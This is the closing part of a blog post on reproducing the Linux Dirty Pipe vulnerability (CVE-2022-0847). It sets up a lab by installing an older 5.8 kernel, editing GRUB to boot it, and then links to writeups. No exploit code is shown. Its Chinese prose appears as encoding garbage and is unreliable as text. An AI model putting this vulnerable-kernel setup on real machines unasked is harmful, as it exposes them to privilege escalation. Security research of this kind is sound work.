<p>È¶ñÂÖàÂÖàÁî®aptÂØªÊâæ‰∏Ä‰∏ãËøô‰∏™ÁâàÊú¨</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-cache search linux | grep 5.8.<br></code></pre></td></tr></table></figure>

<p>ÈÄâÊã©Ëøô‰∏™</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321203416.png" srcset="/img/loading.gif" lazyload></p>
<p>‰∏ãËΩΩ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install linux-image-5.8.0-63-generic<br></code></pre></td></tr></table></figure>

<p>Êé•‰∏ãÊù•Êõ¥ÊîπgrubÂêØÂä®È°π</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gedit /etc/default/grub<br></code></pre></td></tr></table></figure>

<p>ÊîπÊàêËøôÊ†∑</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># If you change this file, run &#x27;update-grub&#x27; afterwards to update</span><br><span class="hljs-comment"># /boot/grub/grub.cfg.</span><br><span class="hljs-comment"># For full documentation of the options in this file, see:</span><br><span class="hljs-comment">#   info -f grub -n &#x27;Simple configuration&#x27;</span><br><br><span class="hljs-attr">GRUB_DEFAULT</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">GRUB_TIMEOUT_STYLE</span>=hidden<br><span class="hljs-attr">GRUB_TIMEOUT</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">GRUB_DISTRIBUTOR</span>=`lsb_release -i -s <span class="hljs-number">2</span>&gt; /dev/null || echo Debian`<br><span class="hljs-attr">GRUB_CMDLINE_LINUX_DEFAULT</span>=<span class="hljs-string">&quot;text&quot;</span><br><span class="hljs-attr">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US&quot;</span><br><br><span class="hljs-comment"># Uncomment to enable BadRAM filtering, modify to suit your needs</span><br><span class="hljs-comment"># This works with Linux (no patch required) and with any kernel that obtains</span><br><span class="hljs-comment"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span><br><span class="hljs-comment">#GRUB_BADRAM=&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span><br><br><span class="hljs-comment"># Uncomment to disable graphical terminal (grub-pc only)</span><br><span class="hljs-comment">#GRUB_TERMINAL=console</span><br><br><span class="hljs-comment"># The resolution used on graphical terminal</span><br><span class="hljs-comment"># note that you can use only modes which your graphic card supports via VBE</span><br><span class="hljs-comment"># you can see them in real GRUB with the command `vbeinfo&#x27;</span><br><span class="hljs-comment">#GRUB_GFXMODE=640x480</span><br><br><span class="hljs-comment"># Uncomment if you don&#x27;t want GRUB to pass &quot;root=UUID=xxx&quot; parameter to Linux</span><br><span class="hljs-comment">#GRUB_DISABLE_LINUX_UUID=true</span><br><br><span class="hljs-comment"># Uncomment to disable generation of recovery mode menu entries</span><br><span class="hljs-comment">#GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br><br><span class="hljs-comment"># Uncomment to get a beep at grub start</span><br><span class="hljs-comment">#GRUB_INIT_TUNE=&quot;480 440 1&quot;</span><br></code></pre></td></tr></table></figure>

<p>Êõ¥Êñ∞<code>grub</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-grub<br></code></pre></td></tr></table></figure>

<p>rebootÈáçÂêØÂêéÁãÇÊåâ<strong>SHIFT+TAB</strong>ËøõÂÖ•ÂºïÂØºÊ®°ÂºèÔºåÈÄâÊã©È´òÁ∫ßËÆæÁΩÆÔºåÈÄâÊã©Êñ∞‰∏ãËΩΩÁöÑÂÜÖÊ†∏ÁâàÊú¨ÔºåÂç≥ÂèØÂÆåÊàêÁéØÂ¢ÉÊê≠Âª∫</p>
<h1 id="0xffÔºöÂÜôÂú®ÊúÄÂêéÁöÑÊúÄÂêé"><a href="#0xffÔºöÂÜôÂú®ÊúÄÂêéÁöÑÊúÄÂêé" class="headerlink" title="0xffÔºöÂÜôÂú®ÊúÄÂêéÁöÑÊúÄÂêé"></a>0xffÔºöÂÜôÂú®ÊúÄÂêéÁöÑÊúÄÂêé</h1><p><a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability ‚Äî The Dirty Pipe Vulnerability documentation (cm4all.com)</a></p>
<p>ÊãúËØªÂÆåÊºèÊ¥ûÂèëÁé∞ËÄÖÁöÑÂçöÂÆ¢ÔºåÊï¨‰Ω©‰ªñÂ±ÖÁÑ∂ËÉΩ‰ªé‰∏ÄÊ¨°Â∞èÂ∞èÁöÑ<strong>CRC</strong>Ê†°È™åÈîôËØØÂÖ•ÊâãÔºåÊ∑±ÊåñËøë‰∏ÄÂπ¥Êó∂Èó¥ÔºåÊåñÊéòÂéüÊú¨Âπ∂‰∏çÁÜüÊÇâÁöÑ<strong>Linux Kernel</strong>Ôºå</p>
<p>Âπ∂ÊúÄÁªàÂèëÁé∞‰∫Ü<strong>Dirty Pipe</strong>Ëøô‰∏ÄÂ®ÅÂäõÂ∑®Â§ßÁöÑÂÜÖÊ†∏<code>0day</code></p>
<p>‰ΩúËÄÖÁöÑÊé¢Á¥¢Á≤æÁ•ûÔºåÂÄºÂæóÁ¨îËÄÖÂ≠¶‰π†</p>
<p><strong>Ë∑ØÊº´Êº´ÂÖ∂‰øÆËøúÂÖÆÔºåÂêæÂ∞Ü‰∏ä‰∏ãËÄåÊ±ÇÁ¥¢</strong></p>
<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-280442.htm">CVE-2022-0847 dirtypipeÊºèÊ¥ûÂ§çÁé∞-‰∫åËøõÂà∂ÊºèÊ¥û-ÁúãÈõ™-ÂÆâÂÖ®Á§æÂå∫|ÂÆâÂÖ®ÊãõËÅò|kanxue.com</a></p>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/#%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0%E7%AE%A1%E9%81%93">„ÄêCVE.0x06„ÄëCVE-2022-0847 ÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê - arttnba3‚Äôs blog</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/OS/" class="print-no-link">#OS</a>
      
        <a href="/tags/linux/" class="print-no-link">#linux</a>
      
        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
      
        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2022-0847ÔºàDirty Pipe) Remake</div>
      <div>http://example.com/2024/03/18/dirtypipe/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>‰ΩúËÄÖ</div>
          <div>korey0sh1</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>ÂèëÂ∏É‰∫é</div>
          <div>2024Âπ¥3Êúà18Êó•</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>ËÆ∏ÂèØÂçèËÆÆ</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ÁΩ≤Âêç">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/02/27/dirtycow/" title="CVE-2016-5195(Dirty Cow) Remake">
                        <span class="hidden-mobile">CVE-2016-5195(Dirty Cow) Remake</span>
                        <span class="visible-mobile">‰∏ã‰∏ÄÁØá</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ÁõÆÂΩï</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">ÊêúÁ¥¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">ÂÖ≥ÈîÆËØç</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        ÊÄªËÆøÈóÆÈáè 
        <span id="busuanzi_value_site_pv"></span>
         Ê¨°
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        ÊÄªËÆøÂÆ¢Êï∞ 
        <span id="busuanzi_value_site_uv"></span>
         ‰∫∫
      </span>
    
    
  
</div>

  
  
    <!-- Â§áÊ°à‰ø°ÊÅØ ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      ‰∫¨ICPËØÅ123456Âè∑
    </a>
  </span>
  
    
      <span>
        <a
          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
          rel="nofollow noopener"
          class="beian-police"
          target="_blank"
        >
          
            <span style="visibility: hidden; width: 0">|</span>
            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
          
          <span>‰∫¨ÂÖ¨ÁΩëÂÆâÂ§á12345678Âè∑</span>
        </a>
      </span>
    
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°πÔºåÂ∞ÜÂÆÉ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">ÂçöÂÆ¢Âú®ÂÖÅËÆ∏ JavaScript ËøêË°åÁöÑÁéØÂ¢É‰∏ãÊµèËßàÊïàÊûúÊõ¥‰Ω≥</div>
  </noscript>
</body>
</html>
